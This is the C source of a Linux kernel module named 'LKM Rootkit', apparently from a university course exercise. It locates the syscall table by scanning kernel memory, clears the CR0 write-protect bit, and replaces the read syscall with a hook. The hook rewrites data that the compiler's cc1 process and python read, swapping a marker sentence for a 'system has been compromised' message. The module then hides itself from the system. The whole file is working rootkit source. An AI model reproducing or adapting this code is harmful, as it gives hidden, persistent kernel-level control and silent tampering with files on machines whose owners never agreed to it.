#include <linux/module.h>   // Header file for Linux kernel modules
#include <linux/kernel.h>   // Header file for Linux kernel functions and macros (like printk)
#include <linux/syscalls.h> // Needed for syscall table and __NR_<syscall_name> helpers
#include <asm/paravirt.h>   // Needed for read_cr0, write_cr0
#include <linux/sched.h>    // Used for current task_struct
#include <linux/string.h>   // Needed for string manipulation functions
#include "hide_lkm.h"       // Header file for hide the rootkit.ko module in the OS Kernel

/*
 * Although the sys_call_table is declared as const, we can bypass this restriction by creating a pointer variable that points to its memory location.
*/
unsigned long **sys_call_table;

/*
 * The value of the control register dictates the memory protection status. To overwrite the read system call, we must first disable memory protection by modifying this register. Here, we save the initial value of the control register so that we can restore it later, as memory protection is typically beneficial for system integrity.
 */
unsigned long original_cr0;

/* Pointer from the first character of the predefined sentence if found in buf.*/
char *substring;

/*
 * This is the prototype for the write syscall. We will store the original syscall here before replacing it in the sys_call_table.
 */
asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);

/* This is our new system call function, which serves as a wrapper for the original read syscall. */
asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
    /* Call the original write syscall and store its return value. Now, we can manipulate the buffer contents before exiting the function. */
    long ret;
    ret = ref_sys_read(fd, buf, count);

    if (fd > 2) {
        /*
         * We can obtain the current task name from the current task struct and use it to determine whether we want to modify data in the read buffer before returning to the user. Note that 'cc1' is the name of the task responsible for opening source files during compilation using gcc.
        */
        if (strcmp(current->comm, "cc1") == 0 || strcmp(current->comm, "python") == 0) {
            substring = strstr(buf, "Kernel Implementation - PUC Campinas");
            if (substring != NULL) {
                printk("Sentence: found in buf");

                char* msg = "WARNING: system has been compromised";
                int i;
                for (i = 0; i < strlen(msg); i++) {
                    substring[i] = msg[i];
                }
            }
        }
    }
    return ret;
}

/*
 * The key here is to locate the syscall table in memory, copy it to a non-const pointer array, and then disable memory protection to allow modification of the syscall table.
*/
static unsigned long **aquire_sys_call_table(void) {
    /*
     * PAGE_OFFSET is a macro that indicates the offset where kernel memory starts. This helps us avoid searching for our syscall table in user space memory.
    */
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;
    /* Scan memory to find the syscall table, which is contiguous. */
    printk("Starting syscall table scan from: %lx\n", offset);
    while (offset < ULLONG_MAX) {
        /* Cast our starting offset to match the type of the system call table. */
        sct = (unsigned long **)offset;

        /* We're searching for a bit pattern that matches sct[__NR_close], so we increment 'offset' until we find it. */
        if (sct[__NR_close] == (unsigned long *)sys_close) {
            printk("Syscall table found at: %lx\n", offset);
            return sct;
        }

        offset += sizeof(void *);
    }
    return NULL;
}

static int __init rootkit_start(void) {
    // Find the syscall table in memory
    if (!(sys_call_table = aquire_sys_call_table())) {
        return -1;
    }

    // Record the initial value in the cr0 register
    original_cr0 = read_cr0();
    // Set the cr0 register to turn off write protection
    write_cr0(original_cr0 & ~0x00010000);
    // Copy the old read call
    ref_sys_read = (void *)sys_call_table[__NR_read];
    // Write our modified read call to the syscall table
    sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
    // Turn memory protection back on
    write_cr0(original_cr0);

    hideme(); // Hide the module from the OS Kernel

    return 0;
}

static void __exit rootkit_end(void) {
    if (!sys_call_table) {
        return;
    }

    // Turn off memory protection
    write_cr0(original_cr0 & ~0x00010000);
    // Put the old system call back in place
    sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
    // Memory protection back on
    write_cr0(original_cr0);
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("LKM Rootkit");
MODULE_VERSION("0.01");